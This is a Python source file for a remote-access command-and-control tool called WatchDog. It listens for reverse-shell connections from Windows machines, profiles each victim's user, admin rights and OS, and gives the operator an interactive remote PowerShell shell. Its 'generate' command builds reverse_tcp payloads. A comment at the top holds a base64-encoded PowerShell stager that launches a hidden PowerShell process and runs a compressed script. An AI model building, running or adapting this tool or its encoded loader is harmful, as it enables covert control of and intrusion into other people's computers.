import os
import time
import socket
import colorama
import threading

colorama.init()

# aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAQQAwAFQAJwAnACsAJwAnAHIAbQBVAEMAQQA3AHsAMgB9AFcAKwAyAC8AaQBPAEIARAArAGYAYQB7ADEAfQA5AEgANgBJAHsAMgAnACcAKwAnACcAfQBVAGgASQB0AEoAYQBGAGsASAA2ADIAMAAwAGoAbABKAGUAVwB6AEwATQB3AFUASwBMAEQAcQA1AGkAUQBrAHUASgBxAGEASgBVADgAbwArAC8AdgBjAGIAaAA2AFMAUABhADMAdgB7ADEAfQBPADIAawBqAHQAZgBnAHgATQB4ADUALwA4ADgAMgBNAEYAMgBuAGsAQwA4AG8AagBaAHsAMQB9AEcAbAAvAEgAagA3AFIAcwBtAC8ASABvADcAeABXAHQARgBLAHQAMQBHAGoAcgBKAFEAUwBrAGUAcgAzACcAJwArACcAJwBlADYAewAxAH0ARgBZAEsAQgA4AFUAYgAnACcAKwAnACcAUQBaADIAbQB4AGMAdgBzAFkAMABtAGgAOABmAE8AMgBrAGMAawAwAGoAcwA1ADUAVQBHAEUAUwBoAEoAeQBQAHEAUwBVAFoASgBvAHUAdgBKAFQARwBTADkASgBUAEEAJwAnACsAJwAnADYANgBsADEAZgBFAEYAOABvAFAAcABmAFIAbgBwAGMASAA0AEoAVwBhADUAMgBNADcAQgAvAHAASQBvAEIAeQBnAEsANQBOADQAWgA5ADcASAAwAHEAdQBKAHQARwBCAFcAYQArAHUAMgBiAHEAcwA4AE8AcQB2AFAASwB5AHsAMQB9AFcASwBXAGEASwBwADMAaQA0AFIAWgBGADAASgBHAEYATgAxADUAWgBjAHUARAB6AHoAZgBiAFkAaQAnACcAKwAnACcAbQB0AHEAawBmADgANABRAHYAUgBHAHsAMgB9AE0AbwA5AHAAaABaAFIAZwBsAGUARQBFADYAWQBPADIARwB0AEkAbABZADgAaQBCAFIANABTADcAMwB0ADQAbQBKAFMATwBNAG8AdQA1AFMAMABzAHAAZgBSAHsAMgB9AEIAagAyAFkAdQA2AGoASQBJAGgASgBrAHEAaABsAFoAUwBiAHQAegArAGIAegBQADcAUgBaAGYAdgBnAGcAagBRAFIAZABrADAAbwByAEUAaQBUAG0ARwA0AC8ARQBOADkAUQBuAFMAYQBXAEoAbwA0AEMAUgBBAHsAMgB9AG4ATQBRAGMAcwBUAE0AWQAzAEMAdQBhADYARAAyAEEAMQBmAEUAYQAwAFUAcABZAHkAewAyAH0AbABmADkAaQAnACcAKwAnACcAUgB1AHUAUQBiAFEASABkAGEANQBXADAAaAAwAG8AZwAxAFIATwB4AHsAMQB9AG8AYQBBAFAAcgAxAG0AbQB3AGMAcABJADMAdABGADkAUgBrAC8ASgBRAGQAMAArAEgASQBlAEEASABpAC8ASgBIADYATABnAGoAagBiADcANwBUAHoARABIAHsAMQB9AHUARgA0AHAAdgBsAHUAMABRAGMARgBqAHIAOABZAFIAbQB5AGwAOABVAHMANgB5ADAANABXAHcAcwBlAEwAeQBEAGEAZQBrADgAVABvAGsAKwB2ADQATgBiAEsAewAyAH0AMgBMAHIAbAAxACsAcgBiAHsAMgB9AHEAbwBRAHEASwB0ADIANABUAHsAMgB9AG0AWQBqAFQAbwBQADUAdgBmADYAagA0AEoAZABXAEgAegBaAEgAVQB1AGgAbABLAHIAdABrAFEAUwBQAGkANwBpAEsAOABwAG4ANwBCAHsAMgB9AHUAMgA1AGsASgBBAEYASQB4AGsAawBsAFUASwBzAEEAdwA1AHEAYQByADUAQgBBAHAAYwB3AEUAbQBJAGgAVQBaAGIATQBlAEsASgAyAHMAcQBiAGkAVAB0AGQATwBLAFEAdABJAGoASAB3AEkAYQB3AEoAZQBRAGMAVAAxAHgAOAA3AHMAQQA2AGUAcAByAGEAaABOADEAbwBEAGUAZgBnADUAVQBMAFMAMABnAFIAMABnAGgAbgBlAGYARgByAGoAaABkAHoAawBGAEkAZABSAGgATwBrAHIATABTAFMAeQBGAEoALwBiAEwAaQBFAGMAeABJAFUARgBaAFEAbABOAEIAOABDADYAVwBDAFoAMABQADEAMwB0ADEAMgB5AGcAVAAxAGMAUwBJAEsAYwAzAFAAOQBiADMARABtAHgAegBvADgAUwBrAFMAYwArAGgAQgB7ADEAfQBnAE8ARABjADIAeABDAGYAWQBpAFkAUgBLAFMAdABOAEcAaABCADcANQA5AEcAdwBPAEYANQA5AEYAZwA4AEgATQB3AGIASgBBADUAWgB1AEkAQgA2AHcASQBuAEgAdwBoAEcAUgBMAEQASgA1AG0AegBOAEEAcgBIAGgARwB0ADkAWQBhAFIATgBjAGgAawBSAGEAUABPAGMAQQBnAGwASQBrACsAUgBqAEYANAA0AEoASQBIADYAZwBxAE4ARgBLAHUAeAA1AEwANQBFAHAASQBIAG4AZwBKAG8AVABiAFkAMQB5AFUAbABSAEcATgBCAFoAUQBnAGkAVABMAHcANgAzADgANQA4AGIAVAAyAFoATgA0ADQATQBjAG0AagBvAHgAVQA1AE4AcgBOADMAUQBpAFoAQgBLAFkAcQBqAGcAUwB0ADUAbQBvAE8AVQAnACcAKwAnACcAUQBSAEkATABnAEsATQBlADgANwBXAE4ARQAvAEwAUgAyAGwAYwBhADcAWgAzAFIAcABUADAARQAzADgAUgB0AGUAdABPAFcAOABOAHEAdABpAE4ARgBxAHEAdwAxAC8AUQAxAHAAcgBjAGYAZABUAGMAUAByADEAcQBtAG0AMABmAFMAZgBwAE4AZQBxAGYARQBkADIARwBXAC8AOQB6AEIALwBuAEIAMQA0AEEAYwBlAFMATgBMAGUAQwBjAHQANABmAFIAUQBzADAAOQBOADIAMQByADYAdABuAGsAdQB4ADkAVQB3AHAARwBZADQAUQBVAEcAbgB2AC8AUwBaADIAVAB0AFoAMwBSAHAAVwBZAHQASgB0AGMAeQB4AHQANwBXADMANABsAHQAVwA4AE0ARgBHAHQAWgBuAHsAMgB9AHIANQBnAHIAdwBtADQARABlAEMAbgBUAFcAZABIAHQANwBCAG0ATQBvAHEAZAAwAHoAdQAnACcAKwAnACcANQB7ADEAfQBZAFoAbwB1AGQAZgBIAFUARwBsACsAUABEACsAbgBUAE0AbQBvAFoAewAyAH0AewAxAH0AeQA3AEcAUABQAEUAKwBUAGwAegBEAE0ASQA0AEMANwBMAFoAMwBDAE4AawA4AHEATAB7ADIAfQAzAEYAOQBVAEIAUAAyAC8ANgBhADkAdQBLAHUASABIAGsAVwBDAHQAMABnAHAAQQBUAG4AWQB6AHEATgBqACsAZAAyAEQASABxAEcAUwBNAGMAYgB2AGoAMgBOAEQAdwBOAHgAcQBHAEQANwBQAGMAMwBsAEUAegA3AHcANwByAGQAJwAnACsAJwAnADcAOQBkAHQATgBHAHgAYwB7ADEAfQBiAHQASABSAG0AZwBjAGoAUwAvAHcAMABoADYAUABEAHUAbAAwAGMAegBGAFkAdwByAHkAKwBiAGYAWgBQAEQAZABOAHEAQgBlAFEANwBuADIANABCAHUAQQBaAEgATwBCAHkAQQBUAE8AZwBjACsAcwBzAEYAeQBMAGoAdgB3AFcAQwBIAEoANABkADQAWgB7ADEAfQBOAGsAZwAwAHgAOQBlAG8AMABhAHkAOABtAG0AMwBtAE8AdwBmAHoANAA4ADUARwBqAEUATwBoAGMAWQBuAFUAMQAzAGQAYwBPAG8AVABuAG8AVwBhAHAAcAA4ADMAQQBoAFIASAA4AFIAeABhAFAAYwB4AFMAbQA3AGMANwA2ADUAUgBIAFEAVQA4AEcASAAvAG8AVABCAGIARwA2AEkASgA5AE0AbAB5AG4AMwAxAHQAZQB5AEQAcwBiAG0ANwB7ADEAfQA4AHYAMgAyADYAJwAnACsAJwAnAHAALwA2ADAAdQB2AFcANwBuAHoANgBmAGoAZQBsAG8AegBkAEgAUQBNAEUAJwAnACsAJwAnAGIAdgBnAEIAVwB6AEkAWQAxAEUANwB7ADEAfQBCAGUAMgBxACcAJwArACcAJwA0AHMAUwB4AGIAUAB0ADIAOQBLAGUATwBqADMASABsAEQAagBwAGMANwBRAHgAbgBHAHkAeABBAHcAbwBBAHoAVwAvAFMATgA0ADYAagArAHQANQBIAGUAOQB4AEsAagAnACcAKwAnACcAVQAwAEQAUgA0AEMASwB4AEoASABoAEUASAAzAGgAUAA1AGEATQBCADQAeAB4AG4AMwBaAFEAcgBKADYARAArADEAcgAzADEAUgBrAGoAeAB1ADIATQBxAGUAZQBHACsAbgBLAG4AYQBCACsAMwAxAHUASwBwAGUAUABqAEsAZgBnAEkAUwBaAFQAeAB1ADMASgBHAG8AbABBAHMAeQArAFoAdAB6AFQAUwBoAEwAWgBpADMAcABwAFcAbAB5ACsAdQB2ADUAdgBEAE4AVAB0AHQAYgBLADgAdgBPAGsAbwBGAHoAWgA1ADkAbAA5AHMARQBrAHsAMQB9AFMAaQBhADkAcgBzAEIAZwArAGUARABnAEUATAAyAE0AbQBRAHYAbwBRAGMAbgByADYARAAnACcAKwAnACcAdQBRAEMASABjAEYAdwBPAEoAbwBjADAANQBlADQAaABnAGYAcgBFADcAUABqAHcAJwAnACsAJwAnAEMARQBKAEMAJwAnACsAJwAnAHIAdwB1AHsAMgB9AG4AOAB1ADIAUQBNAFEAewAyAH0ATQBIAEoAQgByAHAAUwBSAGsAYgAzADMAWQAnACcAKwAnACcAcQAwAHMAMwBjAGYAZAAzAGMAaQBlAHYAYQBVAHYANABDAGYANgBOAE8ALwBkAHIALwA3AEQANwBLAGoANgBaADUAVAAwADgAVAA1AFkAJwAnACsAJwAnAGYATAB6AHoAbwBCADcAOABOAGcARABHAG0AQQB1AFEAOABxAE0AeQAnACcAKwAnACcATQA3AE4AOABMAHoAKwBPAFEAcAA4AHUARABDAEUATgBvAEkAQgBVAFcAKwBTAGYAZgAwAE4AMQBVAEgASABUAGcAewAyAH0AWgBaADEAaAA3ADgAQQBQAGUAMgBBAFcANwBrAEwAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBYACcAJwAsACcAJwBWACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA

class WatchDog:
    def __init__(self):
        self.running = True
        self.WatchDog_Version = "0.1.0"

        self.WatchDog_Input_Text = f"{colorama.Fore.RED}@WatchDog>{colorama.Fore.LIGHTBLUE_EX}"
        
        self.generate = {
            "payload" : "",
            "lhost"   : "",
            "lport"   : "",
        }

        self.server = {
            "rhost"   : "",
            "rport"   : "",
            "listening"  : "false"
        }

        self.data_clients = []

        self.s_f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s_f.connect(("8.8.8.8", 80))

        self.server["rhost"] = self.s_f.getsockname()[0]
        self.generate["lhost"] = self.s_f.getsockname()[0]

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(2)

        threading.Thread(target=self.listening).start()
        threading.Thread(target=self.test_connections).start()

        self.startup()

    def startup(self):
        print(colorama.Fore.RED)
        print(f"Well Come To WatchDog {self.WatchDog_Version}...")
        print("")
        self.start()

    def cmd_WhoAmI(self, conn):
        try:
            conn.send(bytes("whoami", "utf-8"))
            rm = conn.recv(64).decode("utf-8")
            return rm[0:-2]
        except:
            return 0
    
    def cmd_Check_Privileges(self, conn):
        conn.send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
        rm = conn.recv(16).decode("utf-8")

        return rm[0:-2]
    
    def cmd_OS_name(self, conn):
        conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
        rm = conn.recv(32).decode("utf-8")

        return rm[0:-2]

    def test_connections(self):
        while self.running:
            time.sleep(10)
            for pp in self.data_clients:
                if not pp[5]:
                    if not self.cmd_WhoAmI(pp[0]):
                        print('\r' + ' ' * 30 + '\r', end='', flush=True)
                        print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}{colorama.Fore.LIGHTBLUE_EX}")
                        print(self.WatchDog_Input_Text, end='', flush=True)
                        self.data_clients.remove(pp)

    def listening(self):
        while self.running:
            if self.server["listening"] == "true":
                try:
                    conn, addr = self.s.accept()
                    print('\r' + ' ' * 30 + '\r', end='', flush=True)

                    User_name = self.cmd_WhoAmI(conn)
                    Check_Privileges = self.cmd_Check_Privileges(conn)
                    name_os = self.cmd_OS_name(conn)

                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges} OS: {name_os}{colorama.Fore.LIGHTBLUE_EX}")
                    print(self.WatchDog_Input_Text, end='', flush=True)

                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, name_os, False])

                except socket.timeout:
                    pass
            time.sleep(2)
        print("Server is off...")

    def sessions(self):
        client_number = 0
        print("")
        for pp in self.data_clients:
            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]} OS: {pp[4]}")
            client_number += 1
        print("")

    def set_server_bind(self):
        try:
            self.s.bind((self.server["rhost"], int(self.server["rport"])))
            self.s.listen()

            print("")
            print("Server is running...")
            print("")
            print(f"IP  : {self.server["rhost"]}")
            print(f"PORT: {self.server["rport"]}")
            print("")

        except Exception as e:
            print(f"Server Error: {e}")

    def shell(self, client_number):
        try:
            self.WatchDog_Input_Text = f"{colorama.Fore.RED}@Shell/{self.data_clients[client_number][2]}>{colorama.Fore.LIGHTBLUE_EX}"

            while True:
                print(self.WatchDog_Input_Text, end='', flush=True)
                co = input()

                if co == "exit":
                    print("Exit Shell...")
                    print("")
                    break
                elif co == "clear":
                    os.system("cls")
                    continue
                elif co == "help":
                    print("")
                    print("you can use powershell commands or")
                    print("viewscreen")
                    print("")
                    continue

                self.data_clients[client_number][0].send(bytes(co, "utf-8"))
                self.data_clients[client_number][0].settimeout(0.8)

                while True:
                    try:
                        print(self.data_clients[client_number][0].recv(16).decode("utf-8"), end="")
                    except socket.timeout:
                        break

        except:
            print("shell error")

        self.WatchDog_Input_Text = f"{colorama.Fore.RED}@WatchDog>{colorama.Fore.LIGHTBLUE_EX}"

    def start(self):
        while True:
            print(self.WatchDog_Input_Text, end="")
            command = input().lower().split(" ")

            if command[0] == "help":
                print("")
                print("generate")
                print("     payload=")
                print("          windows/powershell/reverse_tcp")
                print("          windows/batch/reverse_tcp")
                print("     lhost=")
                print("          192.168.10.1")
                print("     lport=")
                print("          5050")
                print("")
                print("<Example> generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050")
                print("<Example> generate payload=windows/powershell/reverse_tcp lport=5050")
                print("")
                print("")
                print("")
                print("server")
                print("     rhost=")
                print("          192.168.10.1")
                print("     rport=")
                print("          5050")
                print("     listening=")
                print("          true")
                print("          false")
                print("")
                print("<Example> server rhost=192.168.10.1 rport=5050 listening=True")
                print("<Example> server rport=5050 listening=True")
                print("")
                print("")
                print("")
                print("sessions")
                print("")
                print("")
                print("")
                print("shell <client's number>")
                print("")
                print("")
            elif command[0] == "exit":
                print("")
                print("Closing Server...")
                print("")
                break
            elif command[0] == "clear":
                os.system("cls")
            elif command[0] == "generate":
                self.set_generate(self.splitlist(command))
            elif command[0] == "server":
                self.set_server(self.splitlist(command))
                self.set_server_bind()
            elif command[0] == "shell":
                if len(self.data_clients) == 0:
                    print("NO CLIENTS")
                else:
                    if len(command) > 1:
                        self.shell(int(command[1]))
            elif command[0] == "sessions":
                self.sessions()

        self.running = False

    def splitlist(self, li):
        c = []
        for pp in li:
            c.append(pp.split("="))
        return c
    
    def set_generate(self, li):
        for pp in li:
            try:
                self.generate[pp[0]] = pp[1]

            except:
                pass

        # print(f"python {self.generate["payload"]}.py {self.generate["lhost"]} {self.generate["lport"]}")
        print("")
        os.system(f"python {self.generate["payload"]}.py {self.generate["lhost"]} {self.generate["lport"]}")
        print("")

    def set_server(self, li):
        for pp in li:
            try:
                self.server[pp[0]] = pp[1]

            except:
                pass



WatchDog()
